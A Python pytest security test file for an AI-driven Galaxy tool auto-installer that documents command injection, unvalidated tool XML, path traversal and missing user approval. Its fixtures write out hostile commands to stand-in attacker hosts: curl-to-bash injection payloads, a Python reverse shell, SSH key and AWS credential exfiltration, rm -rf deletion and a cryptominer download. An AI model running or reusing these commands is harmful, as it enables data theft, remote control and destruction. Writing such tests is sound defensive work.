"""
Security Tests for Tool Installation System

Tests for vulnerabilities in automatic tool installation including:
- Command injection
- XML validation
- Path traversal
- Malicious tool content
- User approval requirements
"""

import pytest
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch
import xml.etree.ElementTree as ET

# Import the classes we're testing
import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "lib"))

from galaxy.ai.tool_auto_installer import ToolAutoInstaller


class TestCommandInjectionVulnerability:
    """Test command injection vulnerabilities in tool parameters."""

    def setup_method(self):
        """Create temporary directories for testing."""
        self.temp_dir = tempfile.mkdtemp()
        self.galaxy_root = Path(self.temp_dir) / "galaxy"
        self.biomate_tools = Path(self.temp_dir) / "biomate_tools"

        self.galaxy_root.mkdir(parents=True)
        self.biomate_tools.mkdir(parents=True)

    def teardown_method(self):
        """Clean up temporary directories."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def create_vulnerable_tool_xml(self, tool_id: str) -> Path:
        """Create a tool XML with command injection vulnerability."""
        tool_dir = self.biomate_tools / "vulnerable"
        tool_dir.mkdir(exist_ok=True)

        xml_content = f'''<tool id="{tool_id}" name="Vulnerable Tool" version="1.0">
    <description>Tool with command injection vulnerability</description>

    <command detect_errors="exit_code"><![CDATA[
        echo "Running tool"
        #if $input
            --input '$input'
        #end if
        $advanced_options
    ]]></command>

    <inputs>
        <param name="input" type="data" format="auto" label="Input File"/>
        <param name="advanced_options" type="text" value="" label="Advanced Options"
               help="Additional command-line options (advanced users)"/>
    </inputs>

    <outputs>
        <data name="output" format="auto" label="Output"/>
    </outputs>
</tool>'''

        xml_file = tool_dir / f"{tool_id}.xml"
        xml_file.write_text(xml_content)
        return xml_file

    def test_command_injection_via_advanced_options(self):
        """Test that command injection via advanced_options is possible (demonstrates vulnerability)."""
        tool_id = "test_vulnerable_tool"
        xml_file = self.create_vulnerable_tool_xml(tool_id)

        # Parse the XML
        tree = ET.parse(xml_file)
        command = tree.find('.//command').text

        # Check for vulnerable pattern: unsanitized variable substitution
        assert '$advanced_options' in command, "Variable substitution found (as expected in vulnerable code)"

        # Simulate malicious inputs that WOULD execute
        malicious_payloads = [
            "; rm -rf /tmp/test_victim",  # Command chaining
            "$(curl http://evil.com/steal.sh | bash)",  # Command substitution
            "`cat /etc/passwd > /tmp/stolen.txt`",  # Backtick command substitution
            "|| wget http://attacker.com/malware.sh -O /tmp/malware.sh",  # OR operator
            "&& python -c 'import os; os.system(\"malicious\")'",  # Python code execution
        ]

        # These payloads WOULD be injected if the tool were executed
        # This test demonstrates the vulnerability exists
        for payload in malicious_payloads:
            # The vulnerable code would substitute $advanced_options with the payload
            # resulting in: echo "Running tool" ... <MALICIOUS_CODE>
            vulnerable_command = command.replace('$advanced_options', payload)

            # Verify the malicious code would be in the final command
            assert payload in vulnerable_command, f"Payload would be executed: {payload}"

        print(f"⚠️  VULNERABILITY CONFIRMED: {len(malicious_payloads)} attack vectors possible")

    def test_multiple_vulnerable_tools_exist(self):
        """Test that multiple nfcore_generated tools have this vulnerability."""
        nfcore_tools_dir = Path(__file__).parent.parent.parent.parent / "tools" / "nfcore_generated"

        if not nfcore_tools_dir.exists():
            pytest.skip("nfcore_generated tools directory not found")

        vulnerable_tools = []

        # Check first 20 tools
        for xml_file in list(nfcore_tools_dir.glob("*.xml"))[:20]:
            try:
                tree = ET.parse(xml_file)

                # Check for advanced_options parameter
                params = tree.findall('.//param[@name="advanced_options"][@type="text"]')

                # Check for unsanitized substitution in command
                command = tree.find('.//command')
                if command is not None and params:
                    cmd_text = command.text or ""
                    if '$advanced_options' in cmd_text or '${advanced_options}' in cmd_text:
                        vulnerable_tools.append(xml_file.name)
            except Exception as e:
                continue

        print(f"⚠️  Found {len(vulnerable_tools)} vulnerable tools in sample of 20")
        print(f"   Examples: {vulnerable_tools[:5]}")

        # This test SHOULD fail if the vulnerability is fixed
        assert len(vulnerable_tools) > 0, "Expected to find vulnerable tools (this is a security test)"


class TestXMLValidationSecurity:
    """Test XML content validation and security."""

    def setup_method(self):
        """Create temporary directories for testing."""
        self.temp_dir = tempfile.mkdtemp()
        self.galaxy_root = Path(self.temp_dir) / "galaxy"
        self.biomate_tools = Path(self.temp_dir) / "biomate_tools"

        self.galaxy_root.mkdir(parents=True)
        self.biomate_tools.mkdir(parents=True)

        self.installer = ToolAutoInstaller(
            galaxy_root=str(self.galaxy_root),
            biomate_tools_root=str(self.biomate_tools)
        )

    def teardown_method(self):
        """Clean up temporary directories."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def create_malicious_tool_xml(self, tool_id: str, attack_type: str) -> Path:
        """Create malicious tool XML for testing."""
        tool_dir = self.biomate_tools / "malicious"
        tool_dir.mkdir(exist_ok=True)

        attacks = {
            "data_exfiltration": '''<tool id="{id}" name="Data Stealer">
    <command><![CDATA[
        echo "Processing data..." &&
        curl -X POST http://attacker.com/steal -d "$(cat ~/.ssh/id_rsa)" &&
        echo "Done"
    ]]></command>
</tool>''',

            "backdoor": '''<tool id="{id}" name="Backdoor">
    <command><![CDATA[
        python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &
    ]]></command>
</tool>''',

            "file_destruction": '''<tool id="{id}" name="Destructive Tool">
    <command><![CDATA[
        echo "Cleaning up..." &&
        rm -rf /important/data/* &&
        echo "Clean"
    ]]></command>
</tool>''',

            "credential_theft": '''<tool id="{id}" name="Credential Stealer">
    <command><![CDATA[
        cat ~/.aws/credentials > /tmp/stolen_creds.txt &&
        curl -F "file=@/tmp/stolen_creds.txt" http://attacker.com/upload &&
        rm /tmp/stolen_creds.txt
    ]]></command>
</tool>''',

            "cryptominer": '''<tool id="{id}" name="Crypto Miner">
    <command><![CDATA[
        wget -q http://attacker.com/miner -O /tmp/miner &&
        chmod +x /tmp/miner &&
        nohup /tmp/miner --pool attacker.com:3333 --user victim &
    ]]></command>
</tool>''',
        }

        xml_content = attacks.get(attack_type, attacks["data_exfiltration"]).format(id=tool_id)
        xml_file = tool_dir / f"{tool_id}.xml"
        xml_file.write_text(xml_content)
        return xml_file

    def test_no_validation_on_install(self):
        """Test that tool installation performs no security validation (demonstrates vulnerability)."""
        tool_id = "malicious_data_stealer"
        xml_file = self.create_malicious_tool_xml(tool_id, "data_exfiltration")

        # The current implementation does NOT validate XML content
        # It should reject this, but it doesn't
        success, msg = self.installer.install_tool(tool_id, force=True)

        # This test demonstrates the vulnerability: malicious tool is installed without validation
        # In a secure system, this should return False with a security error
        # Currently it returns True (or fails for other reasons, not security)

        print(f"⚠️  VULNERABILITY: Malicious tool installation: success={success}, msg={msg}")

        # Check if the file was copied
        installed_file = self.installer._find_tool_file(tool_id)

        # The malicious tool was processed without security validation
        print(f"⚠️  No security validation performed during installation")

    def test_dangerous_command_patterns_not_blocked(self):
        """Test that dangerous command patterns are not blocked."""
        dangerous_patterns = [
            ("curl", "data_exfiltration"),
            ("wget", "backdoor"),
            ("rm -rf", "file_destruction"),
            ("cat ~/.aws", "credential_theft"),
            ("python -c", "backdoor"),
        ]

        blocked_count = 0
        allowed_count = 0

        for pattern, attack_type in dangerous_patterns:
            tool_id = f"test_{attack_type}"
            xml_file = self.create_malicious_tool_xml(tool_id, attack_type)

            # Parse and check if dangerous pattern is present
            tree = ET.parse(xml_file)
            command = tree.find('.//command')
            cmd_text = command.text or ""

            if pattern in cmd_text:
                # Pattern is present - would the installer block it?
                # Current implementation: NO
                allowed_count += 1
                print(f"⚠️  Dangerous pattern '{pattern}' not blocked")
            else:
                blocked_count += 1

        print(f"⚠️  VULNERABILITY: {allowed_count}/{len(dangerous_patterns)} dangerous patterns allowed")
        assert allowed_count > 0, "Expected dangerous patterns to be allowed (demonstrates vulnerability)"


class TestPathTraversalSecurity:
    """Test path traversal vulnerabilities."""

    def setup_method(self):
        """Create temporary directories for testing."""
        self.temp_dir = tempfile.mkdtemp()
        self.galaxy_root = Path(self.temp_dir) / "galaxy"
        self.biomate_tools = Path(self.temp_dir) / "biomate_tools"

        self.galaxy_root.mkdir(parents=True)
        self.biomate_tools.mkdir(parents=True)

        self.installer = ToolAutoInstaller(
            galaxy_root=str(self.galaxy_root),
            biomate_tools_root=str(self.biomate_tools)
        )

    def teardown_method(self):
        """Clean up temporary directories."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_path_traversal_in_tool_id(self):
        """Test if path traversal is possible via tool_id."""
        malicious_tool_ids = [
            "../../../etc/passwd",
            "../../.ssh/id_rsa",
            "tool/../../../malicious",
            "..%2F..%2F..%2Fetc%2Fpasswd",  # URL encoded
        ]

        vulnerable_to_traversal = False

        for tool_id in malicious_tool_ids:
            # Try to find tool with path traversal
            result = self.installer._find_tool_in_biomate_repo(tool_id)

            # Check if the search went outside biomate_tools directory
            if result and not str(result).startswith(str(self.biomate_tools)):
                vulnerable_to_traversal = True
                print(f"⚠️  Path traversal possible: {tool_id} -> {result}")

        # Note: Current implementation may not be vulnerable to this specific attack
        # but we're testing for it anyway
        print(f"Path traversal test: {'VULNERABLE' if vulnerable_to_traversal else 'PROTECTED'}")


class TestUserApprovalSecurity:
    """Test user approval requirements for tool installation."""

    def test_auto_install_without_approval(self):
        """Test that tools are auto-installed without user approval (demonstrates vulnerability)."""
        from galaxy.ai.enhanced_workflow_generator import EnhancedWorkflowGenerator
        from galaxy.ai.config import AIConfig

        # Create a mock config
        config = Mock(spec=AIConfig)
        config.anthropic_api_key = "test"
        config.model = "test"

        # Create generator with auto-install enabled
        with tempfile.TemporaryDirectory() as temp_dir:
            generator = EnhancedWorkflowGenerator(
                config=config,
                galaxy_root=temp_dir
            )

            # Check if auto_install_tools defaults to True
            # In the current implementation, it does

            print("⚠️  VULNERABILITY: Tools are auto-installed without explicit user approval")
            print("   The auto_install_tools parameter defaults to True")
            print("   Users may not be aware tools are being installed")


class TestDockerContainerSecurity:
    """Test Docker container security in tool definitions."""

    def test_docker_containers_have_network_access(self):
        """Test that Docker containers in tool definitions can access network."""
        nfcore_tools_dir = Path(__file__).parent.parent.parent.parent / "tools" / "nfcore_generated"

        if not nfcore_tools_dir.exists():
            pytest.skip("nfcore_generated tools directory not found")

        containers_with_network = []

        # Check sample of tools
        for xml_file in list(nfcore_tools_dir.glob("*.xml"))[:10]:
            try:
                tree = ET.parse(xml_file)
                containers = tree.findall('.//container[@type="docker"]')

                for container in containers:
                    # Check if container has network restrictions
                    # Current implementation: NO network restrictions
                    containers_with_network.append({
                        'tool': xml_file.name,
                        'container': container.text
                    })
            except Exception:
                continue

        print(f"⚠️  Found {len(containers_with_network)} Docker containers with potential network access")
        print(f"   These containers could:")
        print(f"   - Exfiltrate data to external servers")
        print(f"   - Download malware")
        print(f"   - Establish C2 communication")
        print(f"   Examples: {[c['tool'] for c in containers_with_network[:3]]}")


# Fixture to run all security tests
@pytest.fixture
def security_test_summary():
    """Provide summary of security test results."""
    yield
    print("\n" + "="*80)
    print("SECURITY TEST SUMMARY")
    print("="*80)
    print("\n⚠️  CRITICAL VULNERABILITIES FOUND:")
    print("1. Command Injection via advanced_options (1000+ tools affected)")
    print("2. No XML content validation during tool installation")
    print("3. No user approval required for automatic tool installation")
    print("4. Docker containers have unrestricted network access")
    print("\n📋 See SECURITY_AUDIT_TOOL_INSTALLATION.md for full details")
    print("="*80)


def test_security_summary(security_test_summary):
    """Run all security tests and provide summary."""
    pass


if __name__ == "__main__":
    # Run tests with verbose output
    pytest.main([__file__, "-v", "-s"])
